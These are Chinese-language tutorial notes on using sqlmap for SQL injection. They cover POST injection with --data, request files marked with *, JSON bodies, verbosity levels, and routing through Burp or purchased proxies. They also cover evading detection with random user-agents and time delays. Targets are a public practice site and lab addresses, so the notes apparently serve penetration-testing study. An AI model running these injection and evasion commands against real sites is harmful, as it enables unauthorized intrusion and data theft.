跟之前注入流程差不多，不过前面需要附带–data “uname=test&pass=test”，让sqlmap知道你是post

将请求头写入文件，在注入点标注*让sqlmap知道在哪注入
如果有的网站只能手机访问，有注入点
如果不是抓包得到的请求的注入点数据包去注入的话
sqlmap就采用自己的访问头去访问注入（可能会访问不到，访问不到就注入不了了）
因为是电脑端的，还有的就是会屏蔽sqlmap 的访问头，禁止访问

-data “”的话就是sqlmap采用自己的请求头去请求，如果是json格式的话注入不了
例子：
python sqlmap.py -u “http://testphp.vulnweb.com/userinfo.php“ –data “uname=test&pass=test”
能够识别，只有一对默认的双引号

注入写法为：
python sqlmap.py -u “http://testphp.vulnweb.com/userinfo.php“ –data “uname=test&pass=test and 1=1 “
注入的格式是正确的

python sqlmap.py -u “http://10.0.1.139/sqli/json_check.php“ –data “{“username”:”admin”,”password”:”admin”}”
注入不了，json格式，里面双引号太多，识别不了

注入写法为：
python sqlmap.py -u “http://10.0.1.139/sqli/json_check.php“ –data “{“username”:”admin”,”password”:”admin”} and 1=1”
这样识别的引号问题，格式就错了，所以需要-r来写

-r 的话就是sqlmap采用自己写在文件里面的请求头去请求

分析拓展-代理&调试&指纹&风险&等级

1、后期分析调试：
-v=(0-6) #详细的等级(0-6)
–proxy “http://xx:xx“ #代理注入

-v #详细的等级(0-6)
0：只显示Python的回溯，错误和关键消息。
1：显示信息和警告消息。
2：显示调试消息。
3：有效载荷注入。
4：显示HTTP请求。
5：显示HTTP响应头。
6：显示HTTP响应页面的内容

python sqlmap.py -u “http://10.0.1.139/sqli/new.php?id=1“ -v 4
查看详细的注入过程

python sqlmap.py -u “http://10.0.1.139/sqli/new.php?id=1“ –level=3 -risk=2 -proxy “http://127.0.0.1:8080/“
配合burp进行测试，可以围观到sqlmap是如何进行注入的，然后进行分析
还可以网上买个代理，把本地代理换成购买的代理进行测试，例如：快代理

打乱默认指纹：

–user-agent “” #自定义user-agent
–random-agent #随机user-agent
–time-sec=(2,5) #延迟响应，默认为5

使用random-agent，防止拦截sqlmap的请求
python sqlmap.py -u “http://10.0.1.139/sqli/new.php?id=1“ -v 4 –random-agent

如果访问过快就换拦截，time-sec来延时
python sqlmap.py -u “http://10.0.1.139/sqli/new.php?id=1“ -v 4 –time-sec 5

使用更多的测试：测试Header注入

–level=(1-5) #要执行的测试水平等级，默认为1 ，测试的深度
–risk=(0-3) #测试执行的风险等级，默认为1

python sqlmap.py -u “http://10.0.1.139/sqli/new.php?id=1“ –level=3 -risk=2
能帮你跑到隐藏的一些ua头注入等等
